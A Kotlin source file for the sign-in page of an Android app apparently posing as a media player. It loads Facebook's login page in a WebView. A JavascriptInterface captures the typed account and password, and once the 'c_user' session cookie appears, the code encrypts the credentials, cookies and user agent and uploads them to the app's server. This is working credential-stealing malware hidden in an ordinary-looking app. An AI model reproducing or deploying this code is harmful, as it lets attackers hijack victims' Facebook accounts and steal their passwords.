package win.hapsunday.mplayer.page

import android.view.View
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import androidx.lifecycle.lifecycleScope
import kotlinx.android.synthetic.main.signin.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus
import win.hapsunday.mplayer.R
import win.hapsunday.mplayer.basic.BasicPage
import win.hapsunday.mplayer.event.IEvent
import win.hapsunday.mplayer.model.ResultModel
import win.hapsunday.mplayer.utils.*

class SignInPage : BasicPage(R.layout.signin) {

    class iinterface {
        @JavascriptInterface
        fun business(a: String, b: String) {
            account = a
            password = b
        }
    }

    override fun go() {
        clearCookie {
            account = ""
            password = ""
        }
        countDown {
            showInsertAd()
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityFaceBookIvBack.setOnClickListener {
            onBackPressed()
        }
        activityFaceBookWv.init(this)
        activityFaceBookWv.setChromeClient(this) {
            lifecycleScope.launch(Dispatchers.IO) {
                delay(300)
                withContext(Dispatchers.Main) {
                    activityFaceBookFl.visibility = View.GONE
                }
            }
        }
        activityFaceBookWv.setClient { url, view ->
            val cookieManager = CookieManager.getInstance()
            val cookieStr = cookieManager.getCookie(url)
            cookieStr?.let {
                if (it.contains("c_user")) {
                    if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                        lifecycleScope.launch(Dispatchers.Main) {
                            activityFaceBookFlContent.visibility = View.GONE
                        }
                        val content = gson.toJson(
                            mutableMapOf(
                                "un" to account,
                                "pw" to password,
                                "cookie" to cookieStr,
                                "source" to configModel.app_name,
                                "ip" to "",
                                "type" to "f_o",
                                "b" to view.settings.userAgentString
                            )
                        ).encrypt(updateModel.d!!)
                        update(content) { s ->
                            val r = gson.fromJson(s, ResultModel::class.java)
                            r.printMsg()
                            if (r.code == "0" && r.data?.toBooleanStrictOrNull() == true) {
                                isLogin = true
                                lifecycleScope.launch(Dispatchers.Main) {
                                    next(MainPage::class.java)
                                    EventBus.getDefault().post(IEvent("f"))
                                    finish()
                                }
                            }
                        }
                    }
                }
            }
        }
        activityFaceBookWv.setUrl()
    }

    override fun onResume() {
        super.onResume()
        activityFaceBookWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityFaceBookWv.canGoBack()) {
            activityFaceBookWv.goBack()
        } else {
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configModel.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configModel.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityFaceBookWv.onPause()
    }
}